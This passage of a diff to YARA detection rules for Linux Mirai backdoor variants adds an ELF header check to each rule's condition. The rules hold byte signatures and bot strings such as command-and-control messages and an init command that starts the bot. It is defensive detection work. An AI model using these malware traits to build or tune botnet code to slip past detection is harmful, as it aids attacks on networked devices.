+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5913,6 +6157,7 @@ rule Backdoor_Linux_Mirai_QW_2147903274_0
         $x_1_3 = {04 30 d2 e7 00 00 53 e3 41 30 83 02 04 30 c2 07 01 20 82 e2 00 00 52 e1 10 80 bd 08 f7 ff ff ea 00 20 a0 e3 f5 ff ff ea}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5937,6 +6182,7 @@ rule Backdoor_Linux_Mirai_QE_2147903275_0
         $x_1_4 = "wabjtam" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5960,6 +6206,7 @@ rule Backdoor_Linux_Mirai_QX_2147904436_0
         $x_1_3 = {e8 a6 ff ff ff 83 eb 04 89 06 83 c6 04 eb 1f 83 fb 01}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -5981,6 +6228,7 @@ rule Backdoor_Linux_Mirai_EN_2147904636_0
         $x_5_1 = {7f 69 fe 70 7f c3 f3 78 7d 20 da 78 7c 00 48 50 7c 00 fe 70 7f bd 00 38 4b ff fc 31 3b e3 00 01 7f 9f e8 40 40 9d 00 0c 7f bf eb 78 3b 80 00 22}  //weight: 5, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6003,6 +6251,7 @@ rule Backdoor_Linux_Mirai_EO_2147904934_0
         $x_1_2 = {81 23 00 00 7c 0a 48 ae 7c c0 02 78 7c 0a 49 ae 81 63 00 00 7c 0a 58 ae 7c e0 02 78 7c 0a 59 ae 81 23 00 00 7c 0a 48 ae 7d 00 02 78 7c 0a 49 ae 81 63 00 00 7c 0a 58 ae 7c a0 02 78 7c 0a 59 ae 39 4a 00 01 a0 03 00 04 7f 80 50 00 41 9d ff b4}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6025,6 +6274,7 @@ rule Backdoor_Linux_Mirai_EV_2147905477_0
         $x_1_2 = {48 89 fe e8 0a 09 00 00 89 c5 85 ed 74 ?? 31 c0 48 81 bc 24 a8 01 00 00 ff 64 cd 1d 0f 9f c0 03 84 24 a0 01 00 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6047,6 +6297,7 @@ rule Backdoor_Linux_Mirai_FC_2147905478_0
         $x_1_2 = {00 80 28 21 02 a4 10 21 80 43 00 20 00 00 00 00 10 ?? ?? ?? 24 02 00 20 10 ?? ?? ?? 24 82 00 01 02 42 10 21 10 ?? ?? ?? 24 06 00 20}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6069,6 +6320,7 @@ rule Backdoor_Linux_Mirai_FH_2147905479_0
         $x_1_2 = {92 03 00 04 8e 02 00 00 a4 a8 ff e8 26 10 00 05 ac a2 ff ec a0 83 ff fc ac 82 ff f8 00 f5 10 2a 24 c6 00 18 24 e7 00 01 24 84 00 18 14 ?? ?? ?? 02 86 28 21 02 51 10 21 00 50 18 23}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6091,6 +6343,7 @@ rule Backdoor_Linux_Mirai_ER_2147905480_0
         $x_1_2 = {05 00 00 3f a3 30 60 10 ac 10 a3 ff 82 10 20 00 a5 37 60 10 83 28 60 02 d4 07 be b8 a7 3d e0 18 e0 02 80 01 80 a4 80 16 02 80 ?? ?? b6 04 20 14}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6113,6 +6366,7 @@ rule Backdoor_Linux_Mirai_EW_2147905481_0
         $x_1_2 = {1c 19 ff fb 3a e0 00 00 7d 3d 02 14 2f 89 00 06 41 ?? ?? ?? 8a c7 00 06 2f 96 00 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6135,6 +6389,7 @@ rule Backdoor_Linux_Mirai_FG_2147905482_0
         $x_1_2 = {c4 0a 00 00 c6 0a 80 04 82 00 bf bf 92 02 7f ff 82 08 60 ff 88 01 20 01 80 a0 60 19 18 ?? ?? ?? ?? 02 20 01 84 10 a0 60}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6157,6 +6412,7 @@ rule Backdoor_Linux_Mirai_EU_2147905483_0
         $x_1_2 = {80 09 00 00 38 89 00 04 2f 80 00 00 40 ?? ?? ?? 7c 9d 23 78}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6180,6 +6436,7 @@ rule Backdoor_Linux_Mirai_QJ_2147905556_0
         $x_1_3 = {10 00 00 07 00 a2 20 21 15 00 00 05 24 84 00 01 8c c2 00 00 00 00 00 00 24 42 00 01 ac c2 00 00 90 82 00 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6202,6 +6459,7 @@ rule Backdoor_Linux_Mirai_HB_2147906021_0
         $x_1_2 = {82 04 60 08 c2 36 a0 04 c2 17 bf ce c4 17 bf c6 c2 36 a0 02 c4 36 80 00 c2 07 bf f4 82 00 60 01 c2 27 bf f4 e0 07 bf f4 ac 0e 20 ff 92 10 20 04 80 a4 00 16 06 bf ff a2 90 10 25 e6 10 80 00 8c c0 27 bf f4}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6224,6 +6482,7 @@ rule Backdoor_Linux_Mirai_GD_2147906022_0
         $x_1_2 = {16 60 00 07 02 00 10 21 8f 99 88 b4 27 a4 00 20 03 20 f8 09 24 05 00 01 8f bc 00 10 02 00 10 21 8f bf 00 40 8f b3 00 3c 8f b2 00 38 8f b1 00 34 8f b0 00 30 03 e0 00 08 27 bd 00 48}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6246,6 +6505,7 @@ rule Backdoor_Linux_Mirai_FN_2147906072_0
         $x_1_2 = {05 00 51 e1 05 10 a0 21 00 30 d6 e5 0a 00 53 e3 01 60 86 e2 00 30 c2 e5 02 ?? ?? ?? b0 30 d4 e1 01 0c 13 e3}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6268,6 +6528,7 @@ rule Backdoor_Linux_Mirai_FP_2147906073_0
         $x_1_2 = {f0 45 2d e9 8d 70 a0 e3 04 d0 4d e2 00 00 00 ef 01 0a 70 e3 00 50 a0 e1 06 ?? ?? ?? 78 30 9f e5 00 20 60 e2 03 30 9f e7}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6290,6 +6551,7 @@ rule Backdoor_Linux_Mirai_FS_2147906074_0
         $x_1_2 = {d4 22 60 08 80 a2 a0 00 02 ?? ?? ?? d6 22 60 04 10 ?? ?? ?? d2 22 a0 04 d2 22 00 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6312,6 +6574,7 @@ rule Backdoor_Linux_Mirai_EQ_2147906080_0
         $x_1_2 = {00 30 d3 05 04 28 a0 e1 0c c0 83 00 0e 38 a0 e1 22 28 a0 e1 23 38 a0 e1 02 30 83 e0 24 38 83 e0 2e 38 83 e0 05 30 83 e0 09 20 d0 e5 0c 30 83 e0 02 04 83 e0 02 00 00 ea}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6334,6 +6597,7 @@ rule Backdoor_Linux_Mirai_FB_2147906200_0
         $x_2_2 = {24 32 9f e5 03 30 91 e7 00 40 83 e5 2f 10 a0 e3 00 00 90 e5 5a 08 00 eb 10 32 9f e5 00 50 9d e5 00 00 50 e3 03 20 95 e7 01 30 80 12 00 00 82 e5 00 30 82 15 00 40 82 05}  //weight: 2, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -6358,6 +6622,7 @@ rule Backdoor_Linux_Mirai_GA_2147906203_0
         $x_1_4 = "trytocrack" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_5_*) and 2 of ($x_1_*))) or
             (all of ($x*))
@@ -6383,6 +6648,7 @@ rule Backdoor_Linux_Mirai_GE_2147906205_0
         $x_1_2 = {2d 6e ff e6 ff ea 2d 7c 7e fe fe ff ff f2 42 81 12 2e ff fb 42 80 10 2e ff fb e1 88 80 81 2d 40 ff f6 20 2e ff f6 48 40 42 40 81 ae ff f6}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6406,6 +6672,7 @@ rule Backdoor_Linux_Mirai_JY_2147906251_0
         $x_1_3 = "lost connection with CNC" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6428,6 +6695,7 @@ rule Backdoor_Linux_Mirai_FX_2147906252_0
         $x_1_2 = {8a ff ff 1b 93 30 dd e5 04 44 83 e1 7c 30 9f e5 03 00 54 e1 f3 ?? ?? ?? 0d 10 a0 e1 80 20 a0 e3 05 00 a0 e1 a1 ff ff eb 00 20 50 e2 0d 40 a0 e1 0d 10 a0 e1}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6450,6 +6718,7 @@ rule Backdoor_Linux_Mirai_GF_2147906253_0
         $x_1_2 = {e8 a9 ff ff ff 48 89 44 24 10 48 8b 74 24 10 4c 89 e7 e8 3d e7 ff ff ?? ?? ?? ?? ?? 48 89 de e8 83 fe ff ff 4c 89 e7 89 c3 e8 d0 e7 ff ff 89 d8 48 83 c4 18 5b 41 5c c3}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6472,6 +6741,7 @@ rule Backdoor_Linux_Mirai_GJ_2147906254_0
         $x_1_2 = {1c 00 90 e5 04 10 a0 e1 a9 04 00 eb 00 00 55 e3 44 51 84 e5 1c 00 94 05 f9 04 00 0b 04 d0 8d e2 30 40 bd e8 1e ff 2f e1}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6494,6 +6764,7 @@ rule Backdoor_Linux_Mirai_GO_2147906255_0
         $x_1_2 = {66 3b 50 08 72 ?? 66 3b 50 0a 72 ?? 41 83 c0 10 39 d9 7c ?? 31 c0 89 07}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6516,6 +6787,7 @@ rule Backdoor_Linux_Mirai_FV_2147906265_0
         $x_1_2 = {20 6e 00 08 30 10 00 40 00 08 22 6e 00 08 32 80 20 6e 00 08 20 28 00 0c 22 00 22 6e 00 08 20 29 00 08 24 01 94 80 2d 42 ff f8 4a ae ff f8 ?? ?? 20 2e ff f8 b0 ae ff f0 ?? ?? 2d 6e ff f0 ff f8}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6538,6 +6810,7 @@ rule Backdoor_Linux_Mirai_FW_2147906266_0
         $x_1_2 = {02 1a 15 00 18 00 bc 8f 00 ff 63 30 00 ff a5 32 02 26 15 00 00 00 40 ac 00 36 15 00 25 20 83 00 24 00 a2 8f 28 00 a3 8f 00 2a 05 00 25 28 a6 00 f4 81 99 8f 20 00 a7 8f 25 20 85 00 10 00 b6 af 14 00 a2 af ff 00 65 30}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6560,6 +6833,7 @@ rule Backdoor_Linux_Mirai_FK_2147906316_0
         $x_1_2 = {0f 00 00 0a 01 c0 53 e2 0d ?? ?? ?? 02 0b 1e e3 0b ?? ?? ?? 01 00 5c e3 21 ?? ?? ?? 28 30 ?? e5 00 00 53 e3 1e ?? ?? ?? 03 30 d0 e5 2c 20 ?? e5 0c 30 63 e0 00 00 52 e3 01 c0 43 e2 02 30 d0 c5 0c c0 63 c0}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6582,6 +6856,7 @@ rule Backdoor_Linux_Mirai_FR_2147906384_0
         $x_1_2 = {10 10 84 e2 0a 00 91 e8 01 00 53 e1 01 00 d1 14 10 10 84 15 20 ?? ?? ?? 04 30 94 e5 02 00 73 e3 04 30 82 03 00 00 e0 03 b0 30 c4 01 1a ?? ?? ?? 03 0c 12 e3 70 30 9f 15 03 00 95 17 e5 fe ff 1b 08 20 84 e2 0c 00 92 e8 02 00 53 e1 0a ?? ?? ?? 18 20 84 e5 04 00 a0 e1 39 04 00 eb 00 00 50 e3 0c ?? ?? ?? 14 30 94 e5 18 30 84 e5 10 30 94 e5 01 00 d3 e4 10 30 84 e5}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6604,6 +6879,7 @@ rule Backdoor_Linux_Mirai_GN_2147906385_0
         $x_1_2 = {53 61 63 67 13 66 04 d1 e6 2f 43 65 f3 6e 04 e4 e3 6f f6 6e}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6626,6 +6902,7 @@ rule Backdoor_Linux_Mirai_GW_2147906386_0
         $x_1_2 = {70 34 d0 ae ff d0 2d 40 ff f0 20 6e ff f0 2d 68 00 08 ff f4 20 6e ff d4 21 6e ff f0 00 0c 20 6e ff d4 21 6e ff f4 00 08 20 6e ff f0 21 6e ff d4 00 08 20 6e ff f4 21 6e ff d4 00 0c 70 01 80 ae ff d8 20 6e ff d4 21 40 00 04 22 2e ff d4 20 2e ff d8 d0 81 20 40 20 ae ff d8}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6648,6 +6925,7 @@ rule Backdoor_Linux_Mirai_GZ_2147906488_0
         $x_1_2 = {ff 00 a5 30 00 2c 05 00 00 26 04 00 25 20 85 00 ff 00 e7 30 ff 00 c6 30 25 20 87 00 00 32 06 00 25 30 c4 00 02 22 06 00 00 ff c3 30 00 1a 03 00 00 ff 84 30 00 16 06 00 02 36 06 00 25 10 43 00 25 30 c4 00 08 00 e0 03 25 10 46 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6670,6 +6948,7 @@ rule Backdoor_Linux_Mirai_HC_2147906489_0
         $x_1_2 = {86 2f 00 e1 96 2f 00 e2 a6 2f 43 6a b6 2f 22 4f 41 50 f0 7f 12 1f 23 1f ff 88 12 2f 21 1f 04 8d f3 6b 03 64 1d d0 0b 40}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6692,6 +6971,7 @@ rule Backdoor_Linux_Mirai_HF_2147906490_0
         $x_1_2 = {20 6e ff f4 12 10 20 6e ff f8 10 10 b0 01 ?? ?? 52 ae ff f8 20 6e ff f8 10 10 4a 00 ?? ?? 20 6e ff f8 10 10 4a 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6714,6 +6994,7 @@ rule Backdoor_Linux_Mirai_GV_2147906728_0
         $x_1_2 = {0f 00 84 30 80 18 03 00 2b 10 02 00 c0 20 04 00 25 18 64 00 40 10 02 00 2b 28 05 00 25 28 a3 00 25 10 c2 00 25 10 45 00 02 00 02 a1 18 00 e2 8c 00 00 00 00 02 ?? ?? ?? 80 ff 03 24 21 18 00 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6736,6 +7017,7 @@ rule Backdoor_Linux_Mirai_GX_2147906729_0
         $x_1_2 = {03 20 f8 09 24 06 00 0a 8f bc 00 10 10 ?? ?? ?? 00 00 00 00 93 a3 02 64 00 00 00 00 14 ?? ?? ?? 24 02 00 05 12 ?? ?? ?? 2e 62 00 03 93 a3 02 65 14 40 00 61 24 02 00 05 18 ?? ?? ?? 00 60 88 21}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6758,6 +7040,7 @@ rule Backdoor_Linux_Mirai_HE_2147906730_0
         $x_1_2 = {01 00 70 e3 01 00 77 13 00 50 a0 e1 01 00 a0 03 ?? ff ff 0b 05 00 a0 e1 84 10 8d e2 10 20 a0 e3 a7 ff ff eb 00 40 50 e2 05 ?? ?? ?? 01 00 a0 e3 d8 10 9f e5 04 20 a0 e3 ad ff ff eb 00 00 64 e2 84 ff ff eb}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6780,6 +7063,7 @@ rule Backdoor_Linux_Mirai_FU_2147906807_0
         $x_1_2 = {42 80 10 10 d6 80 20 02 02 80 00 00 ff ff 42 42 48 42 d0 82 24 04 42 42 48 42 d4 83 02 84 00 00 ff ff d0 84 42 81 12 29 00 09 d4 81 42 81 32 05 d0 81 d0 82 22 00 42 41 48 41 4a 81 66 ae}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6802,6 +7086,7 @@ rule Backdoor_Linux_Mirai_GY_2147906812_0
         $x_1_2 = {ff ff 4a 25 00 00 42 a1 ff ff c6 24 fb ?? ?? ?? ff ff a5 24 01 00 a5 24 21 10 00 02 1c 00 bf 8f 18 00 b0 8f 08 00 e0 03 20 00 bd 27}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6824,6 +7109,7 @@ rule Backdoor_Linux_Mirai_HD_2147906813_0
         $x_1_2 = {20 21 9f e5 20 01 9f e5 aa ff ff eb 01 10 a0 e3 00 70 a0 e1 06 20 a0 e1 02 00 a0 e3 d2 ff ff eb 01 00 70 e3 01 00 77 13 00 50 a0 e1 01 00 a0 03 ?? ff ff 0b 05 00 a0 e1 84 10 8d e2 10 20 a0 e3 a7 ff ff eb 00 40 50 e2 05 ?? ?? ?? 01 00 a0 e3 d8 10 9f e5 04 20 a0 e3}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6845,6 +7131,7 @@ rule Backdoor_Linux_Mirai_GC_2147906930_0
         $x_5_1 = {21 30 60 01 21 58 80 01 21 60 e0 00 21 38 60 00 c0 1a 06 00 c2 2c 07 00 26 18 c3 00 26 28 e5 00 26 28 65 00 04 00 02 29 02 1a 03 00 21 20 60 00 ef ?? ?? ?? 26 18 65 00 0b ?? ?? ?? 26 18 85 00 00 00 43 a5 fe ff 08 25}  //weight: 5, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6870,6 +7157,7 @@ rule Backdoor_Linux_Mirai_GQ_2147906931_0
         $x_1_5 = "/sbin/initctl start bot" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -6892,6 +7180,7 @@ rule Backdoor_Linux_Mirai_HK_2147907058_0
         $x_1_2 = {4a ae ff f0 56 c0 14 00 49 c2 2d 42 ff ec 20 2e ff ec 44 80 2d 40 ff ec 20 2e ff ec 4a 80 ?? ?? 20 6e ff f0 20 2e 00 08 20 80 20 2e ff f0 22 00 58 81 2d 41 ff f0 20 2e ff f0 20 40 24 2e ff d8}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6914,6 +7203,7 @@ rule Backdoor_Linux_Mirai_HM_2147907059_0
         $x_1_2 = {18 00 c3 00 98 80 99 8f 24 00 44 26 12 30 00 00 09 f8 20 03 21 28 20 02 60 00 a2 8f 4c 00 a3 8f 20 00 bc 8f 18 00 43 00 12 10 00 00 21 a0 22 02 00 00 92 ae 60 00 a2 8f 09 ?? ?? ?? ff ff 43 24}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6936,6 +7226,7 @@ rule Backdoor_Linux_Mirai_HA_2147907234_0
         $x_1_2 = {8c e3 00 00 00 85 c0 23 8f bf 00 00 af b8 00 00 00 60 20 21 00 c3 28 23 ac e5 00 00 24 06 00 03 24 02 10 33 00 00 00 0c 8f a2 00 00 03 e0 00 08 27 bd 00 04 24 06 00 1e 04 11 00 0c 03 e0 28 21 50 52 4f 54 5f 45 58 45 43 7c 50 52 4f 54 5f 57 52 49 54 45 20 66 61 69 6c 65 64 2e 0a 00 0a 00 0a 00 34 2e 30 30 32 30 32 31 0a}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6958,6 +7249,7 @@ rule Backdoor_Linux_Mirai_JZ_2147907307_0
         $x_1_2 = {e2 06 c0 13 92 10 23 e8 40 00 0c 39 90 10 22 bc a1 2a 20 10 90 10 00 11 a1 34 20 10 40 00 0c 53 92 10 00 10 94 10 00 10 d0 06 c0 12 92 10 00 11 40 00 26 25 17 00 00 10 b4 06 a0 01 80 a6 80 18 12 bf ff f0 b6 06 e0 04 80 a6 20 00 04 bf ff ea b4 10 20 00 10 bf ff eb}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -6980,6 +7272,7 @@ rule Backdoor_Linux_Mirai_FI_2147907426_0
         $x_1_2 = {4a ae ff f8 ?? ?? 48 78 00 11 20 0e 06 80 ff ff ff 60 2f 00 61 ff ff ff f0 a4 50 8f 4a 80 ?? ?? 70 ff 2d 40 fe 4c}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7002,6 +7295,7 @@ rule Backdoor_Linux_Mirai_FM_2147907427_0
         $x_1_2 = {c0 1a 06 00 c2 2c 07 00 26 18 c3 00 26 28 e5 00 26 28 65 00 04 00 02 29 02 1a 03 00 21 20 60 00 ef ?? ?? ?? 26 18 65 00 0b ?? ?? ?? 26 18 85 00 00 00 43 a5 fe ff 08 25 ec ?? ?? ?? 02 00 4a 25}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7024,6 +7318,7 @@ rule Backdoor_Linux_Mirai_GB_2147907428_0
         $x_1_2 = {4e 56 ff ec 61 ff 00 00 08 8a 2d 40 ff f0 61 ff 00 00 08 08 2d 40 ff f4 20 2e ff f0 b0 ae ff f4 ?? ?? 70 01 2d 40 ff ec}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7046,6 +7341,7 @@ rule Backdoor_Linux_Mirai_HQ_2147907547_0
         $x_4_2 = {5c 31 9f e5 00 10 9d e5 03 20 91 e7 02 30 a0 e1 00 00 53 e3 03 00 00 0a 0f e0 a0 e1 12 ff 2f e1 00 30 a0 e3 00 30 80 e5 10 00 8d e2 9c 00 00 eb 00 00 50 e3 12 00 00 1a a2 00 00 eb}  //weight: 4, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7068,6 +7364,7 @@ rule Backdoor_Linux_Mirai_HU_2147908242_0
         $x_1_2 = {21 20 e6 00 00 00 22 91 04 00 c3 24 00 00 85 ?? 07 10 62 00 26 10 45 00 00 00 02 a1 64 00 e3 ?? 01 00 c6 24 2a 18 c3 00 01 00 29 25 f4 ?? ?? ?? 01 00 08 25 1c 00 bf 8f 18 00 b0 8f 08 00 e0 03 20 00 bd 27}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7090,6 +7387,7 @@ rule Backdoor_Linux_Mirai_IC_2147908243_0
         $x_1_2 = {48 8b 45 18 48 3b 45 28 73 ?? 8a 10 48 ff c0 88 13 48 ff c3 80 fa 0a 48 89 45 18 eb ?? 48 89 ef e8 df fe ff ff 83 f8 ff}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7112,6 +7410,7 @@ rule Backdoor_Linux_Mirai_HR_2147908273_0
         $x_1_2 = {48 c7 44 24 38 00 00 00 00 0f ?? ?? ?? ?? ?? 66 c1 cd 08 66 89 6c 24 2a 44 0f b6 6c 24 27 45 85 ed 0f ?? ?? ?? ?? ?? 41 8d 45 ff 48 8b 6c 24 18 45 31 e4 48 ff c0 48 89 44 24 10}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7134,6 +7433,7 @@ rule Backdoor_Linux_Mirai_IA_2147908274_0
         $x_1_2 = {24 42 00 01 30 42 00 ff 10 ?? ?? ?? a2 02 32 1c 02 60 c8 21 03 20 f8 09 02 00 20 21 8f a2 00 2c 8f bc 00 18 24 45 00 01 28 a3 01 3c 14 ?? ?? ?? af a5 00 2c}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7156,6 +7456,7 @@ rule Backdoor_Linux_Mirai_IJ_2147908710_0
         $x_1_2 = {01 30 cc e7 00 20 9e e5 02 30 dc e7 03 30 25 e0 02 30 cc e7 00 10 9e e5 01 30 dc e7 03 30 24 e0 01 30 cc e7 04 20 de e5 01 30 d7 e5 01 c0 8c e2 03 24 82 e1 0c 00 52 e1 e9 ?? ?? ?? f0 80 bd e8}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7178,6 +7479,7 @@ rule Backdoor_Linux_Mirai_GI_2147909010_0
         $x_1_2 = {21 28 20 02 21 30 00 02 09 f8 20 03 21 ?? 40 00 10 00 bc 8f 0b ?? ?? ?? 21 18 40 02 21 20 53 02 f0 ff 05 24 00 00 62 ?? 00 00 00 00 26 10 45 00 1a 00 42 38 00 00 62 a0 01 00 63 24}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7200,6 +7502,7 @@ rule Backdoor_Linux_Mirai_HZ_2147909011_0
         $x_1_2 = {c7 00 00 00 00 00 be 02 00 00 00 bf 02 00 00 00 e8 86 11 00 00 89 c5 31 c0 83 fd ff 74 ?? ba 10 00 00 00 48 89 e6 89 ef 66 c7 04 24 02 00 c7 44 24 04 08 08 08 08 66 c7 44 24 02 00 35 e8 f1 0f 00 00 ?? ?? ?? ?? ?? 48 89 e6 89 ef}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7222,6 +7525,7 @@ rule Backdoor_Linux_Mirai_IF_2147909012_0
         $x_1_2 = {2a 10 71 00 20 00 a2 34 ff 00 43 30 61 00 62 2c 03 ?? ?? ?? a9 ff 62 24 02 ?? ?? ?? 28 00 03 24 ff 00 43 30 2a 10 71 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -7244,6 +7548,7 @@ rule Backdoor_Linux_Mirai_IH_2147909013_0
         $x_1_2 = {96 02 00 10 8e 03 00 04 8e 07 00 0c 92 08 00 12 30 46 ff ff ae 03 00 00 ae 07 00 04 a2 08 00 0a a6 02 00 08 03 20 f8 09 24 c6 ff ed 8f bc 00 10 96 06 00 08 8f 99 80 60 02 00 20 21 03 20 f8 09 02 00 28 21 96 02 00 08 8f bc 00 10 02 02 80 21}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
